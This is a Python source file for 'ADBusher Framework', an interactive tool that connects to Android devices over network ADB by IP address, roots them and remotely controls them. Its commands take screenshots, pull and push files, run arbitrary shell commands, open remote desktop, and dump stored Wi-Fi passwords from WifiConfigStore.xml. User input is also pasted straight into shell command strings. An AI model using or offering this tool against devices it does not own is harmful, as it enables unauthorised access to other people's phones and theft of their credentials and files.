import sys
import os

con_devices = []


def connect(ip):
    print(os.popen("adb connect " + ip + ":5555").read())
    print(os.popen("adb root").read())
    print("Connect was complete. Interact to devices for manage. Example: interact 0.")


def interact(ip):
    for i in con_devices:
            os.popen("adb disconnect " + i + ":5555")
    os.popen("adb connect " + ip + ":5555")
    os.popen("adb root")
    while True:
        command = input('(adbusher on ' + ip + ')> ').strip()
        if command == 'help':
            print("""
                - screenshot -> Take screenshot device
                - list-packages -> list packages installed on device
                - scrcpy -> Remote desktop manage device
                - download -> download <remote_path> <local_path>
                - upload -> upload <local_path> <remote_path>
                - ls -> list files in folders 
                - shell-com -> shell <command>, for once complete command
                - dump-wifi -> dump password wifi network on device
                - keyevent -> complete keyevent on device (ex. keyevent HOME and etc.). Information about events in events.txt
                - exit -> exit without interact
            """)
        if 'screenshot' in command:
            print("Take Screenshot!")
            os.popen("adb exec-out screencap -p > screenshot.png")
            print("Screenshot is completed. Name: screenshot.png")
        if 'list-packages' in command:
            print("Take installed packages!")
            print(os.popen("adb shell pm list packages -f -3").read())
        if 'scrcpy' in command:
            os.popen("scrcpy")
        if 'download' in command:
            con = command.split()
            print("Download file!")
            os.popen("adb pull " + con[1] + " " + con[2])
            print("Download completed!")
        if 'upload' in command:
            con = command.split()
            print("Upload file!")
            os.popen("adb push " + con[1] + " " + con[2])
            print("Upload completed!")
        if 'ls' in command:
            con = command.split()
            print(con[1])
            print(os.popen("adb shell ls " + str(con[1])).read())
        if 'shell-com' in command:
            con = command.split()
            print(os.popen("adb shell " + con[1]).read())
        if 'dump-wifi' in command:
            os.popen("adb pull /data/misc/wifi/WifiConfigStore.xml")
            print(os.popen("adb shell cat /data/misc/wifi/WifiConfigStore.xml").read())
            print("ConfigFile saved!")
        if 'keyevent' in command:
            con = command.split()
            print(os.popen("adb shell input keyevent " + con[1]).read())
            print("Keyevent is done!")
        if 'exit' in command:
            break

banner = """
 (    )    (  (  (   (  ( (   (( (   
 )\  (()  ()) )\ )\  )\ )\)\ (\())\  
(_()()(_)(_)()(_)(_)((_)_)(_))(_)(_) 
/   \   \| _ ) | | | __| || | __| _ |
| - | |) | _ \ |_| |__ \ __ | _||  /
|_|_|___/|___/\___/|___/_||_|___|_|_|

--=[ ADBusher Framework 1.0 ]=-- 
--=[ Developed by crackme4  ]=-- 
"""

print(banner)
while True:
    command = input('(adbusher)> ').strip()
    if command == 'help':
        print("""
        - con, connect -> Connect to devices (ex. connect 'ip')
        - dev, devices -> list all devices connected
        - kill, kill-all -> disconnect all devices
        - dis 0,1,2,3..., disconnect 0,1,2,3... -> disconnect list devices
        - exit -> exit from script
        - interact 'x' -> interact command on device in list
        - help -> help menu
        """)
    if command == 'exit':
        sys.exit(0)
    if 'con' in command:
        con = command.split()
        connect(con[1])
        if con[1] in con_devices:
            print(con[1] + ' is ready')
        else:
            con_devices.append(con[1])
    if 'dev' in command:
        if len(con_devices) == 0:
            print("No devices")
        for i in range(len(con_devices)):
            package_name = os.popen("adb shell getprop | grep 'ro.product.package_name'").read()
            ind_package_name = package_name.find(":")
            name = os.popen("adb shell getprop | grep 'ro.product.name'").read()
            ind_name = name.find(":")
            print(i, ': ', con_devices[i], ' ', package_name[ind_package_name+3:-2] , ' ', name[ind_name+3:-2])
    if 'kill' in command:
        if len(con_devices) == 0:
            print("No devices")
        for i in con_devices:
            print(os.popen("adb disconnect " + i + ":5555").read())
        con_devices = []
    if 'dis' in command:
        if len(con_devices) == 0:
            print("No devices")
        dis = command.split()
        for i in dis[1]:
            if i == ',':
                continue
            else:
                print(os.popen("adb disconnect " + con_devices[int(i)] + ":5555").read())
                con_devices.remove(con_devices[int(i)])
    if 'interact' in command:
        if len(con_devices) == 0:
            print("No devices")
        interact_int = command.split()
        ip_on_interact = con_devices[int(interact_int[1])]
        interact(ip_on_interact)
